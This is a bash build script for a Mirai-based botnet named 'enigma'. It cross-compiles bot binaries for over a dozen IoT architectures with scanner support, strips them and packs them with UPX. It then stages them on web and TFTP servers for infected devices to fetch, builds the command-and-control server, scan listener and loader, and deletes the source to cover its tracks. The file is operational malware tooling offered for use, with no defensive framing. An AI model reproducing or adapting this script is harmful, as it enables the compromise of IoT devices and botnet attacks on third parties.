#!/bin/bash
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\" -DSCANNERINIT
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_bot_arm7 {
    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\" -DSCANNERINIT
}

function arc_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -o release/"$2"
}


rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
mkdir /var/www/html/
mkdir /var/www/html/bins
mkdir /var/lib/tftpboot

arc_compile arc enigma.arc "-static"
compile_bot i586 enigma.x86 "-static"
compile_bot mips enigma.mips "-static"
compile_bot mipsel enigma.mpsl "-static"
compile_bot armv4l enigma.arm "-static"
compile_bot armv5l enigma.arm5 "-static"
compile_bot armv6l enigma.arm6 "-static"
compile_bot_arm7 armv7l enigma.arm7 "-static"
compile_bot powerpc enigma.ppc "-static"
compile_bot sparc enigma.spc "-static"
compile_bot m68k enigma.m68k "-static"
compile_bot sh4 enigma.sh4 "-static"
compile_bot i686 enigma.x86_32 "-static"

go build -o release/scanListen tools/scanListen.go
go build -o release/cnc cnc/*.go
mv prompt.txt release/
 

#gcc -std=c99 bot/*.c -DDEBUG -static -g -o release/enigma.dbg
compile_bot i586 enigma.out "-static -DDEBUG"

cp release/enigma.* /var/lib/tftpboot
cp release/enigma.* /var/www/html/bins
wget https://github.com/upx/upx/releases/download/v3.96/upx-3.96-amd64_linux.tar.xz
tar xvf upx-3.96-amd64_linux.tar.xz
cd upx-3.96-amd64_linux
chmod 111 upx
./upx --ultra-brute /var/www/html/bins/enigma.*
./upx --ultra-brute /var/lib/tftpboot/enigma.*
cd ..
rm -rf upx*
python bins.py
cd loader/
cp loader /root/release
cd /var/www/html/bins
rm -rf enigma.out
cd
rm -rf ~/bot ~/Projects ~/build.sh ~/cnc ~/tools ~/loader/src ~/installs.txt ~/bins.py ~/dlr



